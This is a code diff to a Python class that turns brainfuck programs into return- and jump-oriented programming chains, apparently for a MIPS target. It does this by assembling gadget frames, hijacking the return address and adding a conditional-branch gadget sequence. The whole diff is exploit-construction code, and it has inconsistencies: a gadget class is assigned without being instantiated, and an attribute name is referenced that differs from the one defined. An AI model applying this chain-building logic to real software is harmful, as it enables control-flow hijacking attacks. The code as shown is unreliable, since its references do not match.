@@ -8,6 +8,7 @@ from bf_parser.jop_gadgets.load_s0 import *
 from bf_parser.jop_gadgets.li_a1_0 import *
 from bf_parser.jop_gadgets.mov_s0_a0 import *
 from bf_parser.jop_gadgets.init_args import *
+from bf_parser.jop_gadgets.init_a5 import *
 
 from bf_parser.rop_gadgets.copy_a3 import *
 from bf_parser.rop_gadgets.restore_a3 import *
@@ -20,7 +21,8 @@ from bf_parser.rop_gadgets.move_sp import *
 from bf_parser.rop_gadgets.pop_s0 import *
 from bf_parser.rop_gadgets.mov_a0_a4 import *
 from bf_parser.rop_gadgets.mov_a4_a3 import *
-from bf_parser.rop_gadgets.beqz_s0 import *
+from bf_parser.rop_gadgets.beqz_a0 import *
+from bf_parser.rop_gadgets.add_a0_s0 import *
 
 class BF_Parser():
     def __init__(self, bf_code):
@@ -43,7 +45,8 @@ class BF_Parser():
         self.__pop_s0     = PopS0()
         self.__mov_a4_a3  = MOVA4_A3()
         self.__mov_a0_a4  = MOVA0_A4()
-        self.__beqz_s0    = Beqz_s0()
+        self.__beqz_a0    = Beqz_a0()
+        self.__add_a0_s0  = Add_A0_S0
 
         # jop gadget objects
         self.__init_a3    = InitializeA3()
@@ -53,6 +56,7 @@ class BF_Parser():
         self.__store_s0   = StoreS0()
         self.__init_a7    = InitializeA5_A7()
         self.__init_args  = InitializeArgs()
+        self.__mov_s0_a0  = MovS0_A0()
 
     def get_entry_point(self):
         return self.__charger.print_vaddr() # charger address that overrides $ra
@@ -83,9 +87,11 @@ class BF_Parser():
                    self.__move_sp.get_frame_size() + \
                    self.__copy_a3.get_frame_size() + \
                    self.__mov_a4_a3.get_frame_size() + \
-                   self.__charger.get_frame_size() + \
                    self.__mov_a0_a4.get_frame_size() + \
-                   self.__beqz_s0.get_frame_size()
+                   self.__charger.get_frame_size() + \
+                   self.__mov_a0_s0.get_frame_size() + \
+                   self.__beqz_a0.get_frame_size() + \
+                   self.__add_a0_s0.get_frame_size()
 
     def __parse_no_jumps(self, start_section, end_section, sp):
         # parse brainfuck code with no conditional jumps
@@ -100,7 +106,7 @@ class BF_Parser():
 
         for idx, instruction in enumerate(self.__bf_code[start_section : end_section]):
             next_gadget_addr = self.__charger.get_vaddr()
-            if idx == end_section - start_section - 1:
+            if idx == end_section - start_section - 1 and end_section != len(self.__bf_code):
                 next_gadget_addr = self.__pop_s0.get_vaddr()
 
             if instruction == '>' or instruction == '<':
@@ -240,12 +246,11 @@ class BF_Parser():
                       self.__move_sp.get_frame_size() + \
                       self.__copy_a3.get_frame_size() + \
                       self.__mov_a4_a3.get_frame_size() + \
-                      self.__charger.get_frame_size() + \
                       0x18 # offset for s3
 
         rop_chain = self.__pop_s0.construct_frame(ra=self.__move_sp.get_vaddr(),
-                                                   s0=sp + self.__pop_s0.get_frame_size() + 0x50 \
-                                                   )
+                                                  s0=sp + self.__pop_s0.get_frame_size() + 0x50 \
+                                                  )
 
         rop_chain += self.__move_sp.construct_frame(ra=self.__copy_a3.get_vaddr(), \
                                                     s0=backup_addr, \
@@ -255,21 +260,28 @@ class BF_Parser():
         
         rop_chain += self.__copy_a3.construct_frame(ra=self.__inc_a3.get_vaddr())
 
-        rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__charger.get_vaddr())
+        rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__mov_a0_a4.get_vaddr())
 
-        rop_chain += self.__charger.construct_frame(ra=self.__mov_a0_a4.get_vaddr(), \
-                                                    s4=self.__beqz_s0.get_vaddr() \
-                                                    )
-
-        rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__load_s0.get_vaddr(), \
-                                                      s2=self.__pop_s0.get_vaddr(), \
+        rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__charger.get_vaddr(), \
                                                       s3=self.__addr_mask # will contain address written at runtime
                                                       )
-                                                    
-        rop_chain += self.__beqz_s0.construct_frame(ra=self.__move_sp.get_vaddr(), \
-                                                    zero_sp=zero_sp + 0x50 + self.__pop_s0.get_frame_size(), \
-                                                    nonzero_sp=nonzero_sp + 0x50 + self.__pop_s0.get_frame_size() \
+
+        rop_chain += self.__charger.construct_frame(ra=self.__load_s0.get_vaddr(), \
+                                                    s4=self.__mov_a0_s0.get_vaddr()
                                                     )
+
+        rop_chain += self.__mov_a0_s0.construct_frame(ra=self.__beqz_a0.get_vaddr(), \
+                                                      s0=nonzero_sp - zero_sp, \
+                                                      s2=1, \
+                                                      s3=1, \
+                                                      s7=self.__move_sp.get_vaddr() \
+                                                      )
+
+        rop_chain += self.__beqz_a0.construct_frame(ra=self.__add_a0_s0.get_vaddr(), \
+                                                    s0=zero_sp \
+                                                    )
+
+        rop_chain += self.__add_a0_s0.construct_frame(ra=self.__mov_s0_a0.get_vaddr())
 
         return rop_chain
 
